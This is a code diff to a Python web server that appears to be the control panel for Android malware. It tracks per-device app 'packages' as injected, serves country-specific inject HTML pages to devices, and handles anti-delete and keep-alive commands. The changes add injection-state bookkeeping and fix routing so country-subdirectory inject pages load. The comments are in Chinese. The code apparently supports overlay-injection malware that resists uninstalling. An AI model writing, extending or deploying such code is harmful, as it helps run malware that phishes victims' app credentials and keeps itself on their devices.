@@ -696,6 +696,16 @@ async def on_device_frame(dev, text, ws):
                         print('[server] injectBatch ready %s (%d pkgs -> injected)' % (dev, len(_pend)), flush=True)
                 except Exception as _e:
                     print('[server] inject ack failed: %s' % str(_e)[:120], flush=True)
+            if command in ('reinject', 'reInject', 'resetInject', 'injectReset') and data.get('success'):
+                try:
+                    import api_impl as _ai3
+                    _d3 = _ai3.db()
+                    _p3 = str(data.get('pkg') or '')
+                    if _d3 and _p3:
+                        _d3.inj_state_set(dev, _p3, 'injected')
+                        print('[inj] reinject ready %s %s -> injected' % (dev, _p3), flush=True)
+                except Exception:
+                    pass
             if command in ('antiDeleteOn', 'antiDeleteOff'):
                 effect = data.get('effect') if isinstance(data.get('effect'), dict) else {}
                 expected = command == 'antiDeleteOn'
@@ -1817,6 +1827,24 @@ def mount_full_surface(app):
                 'category': r.get('category', ''),
                 'country': r.get('country', ''),
             })
+        # 设备来拉配置 = 它已经拿到并准备就绪：
+        # 把该设备处于「等待中(空)/已下发(dispatched)」的包标成 injected（面板「已注入」）
+        try:
+            _dev_ready = str(request.query.get('deviceId') or '').strip()
+            if _dev_ready:
+                import api_impl as _ai_ready
+                _dbr = _ai_ready.db()
+                if _dbr:
+                    _pending = [r.get('package_name') for r in (_dbr.inj_states(_dev_ready) or [])
+                                if (r.get('result') or '') in ('', 'dispatched', 'acknowledged')]
+                    for _p in _pending:
+                        if _p:
+                            _dbr.inj_state_set(_dev_ready, _p, 'injected')
+                    if _pending:
+                        print('[server] inject ready %s (%d pkgs -> injected)' % (_dev_ready, len(_pending)),
+                              flush=True)
+        except Exception as _e:
+            print('[server] inject ready mark failed: %s' % str(_e)[:120], flush=True)
         return web.json_response({'ok': True, 'settings': out, 'count': len(out)})
     app.router.add_get('/api/device-inject-settings', device_inject_settings)
 
@@ -1876,7 +1904,9 @@ def mount_full_surface(app):
             return web.Response(status=404, text='not found')
         with open(path, encoding='utf-8') as fh:
             return web.Response(text=_inject_block(fh.read()), content_type='text/html')
-    app.router.add_get('/inject/file/{name}', inject_file_public)
+    # {name:.*} 才能吃到「jo/xxx.html」这种带国家目录的路径（{name} 不匹配斜杠，
+    # 之前所有子目录请求都落到兜底路由，返回同一份页面 —— 设备预取全是一样大小）
+    app.router.add_get('/inject/file/{name:.*}', inject_file_public)
 
     async def oem_policy_get(request):
         """面板：读取某台设备（或全部）的保活策略覆盖。"""
